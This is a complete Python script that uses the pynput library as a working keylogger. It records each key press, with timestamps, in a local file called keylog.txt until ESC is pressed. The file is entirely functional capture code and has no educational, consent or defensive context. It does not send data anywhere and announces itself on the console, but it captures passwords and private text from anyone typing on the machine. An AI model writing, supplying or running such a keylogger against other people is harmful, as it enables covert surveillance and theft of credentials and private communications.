import pynput
from pynput import keyboard
import logging

# config
LOG_FILE = "keylog.txt"

# setup config
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format='%(asctime)s: %(message)s'
)

def on_press(key):
    """Callback function that is executed when a key is pressed."""
    try:
        # for alphanumeric
        logging.info(str(key.char))
    except AttributeError:
        # for special keys
        if key == keyboard.Key.space:
            logging.info(" ")
        elif key == keyboard.Key.enter:
            logging.info("\n")
        else:
            logging.info(f" [{str(key)}] ")

def on_release(key):
    """Callback function for key release."""
    # logic
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False # stop

# main
if __name__ == "__main__":
    print("Keylogger started. Press ESC to stop.")
    # setup
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
        listener.join()
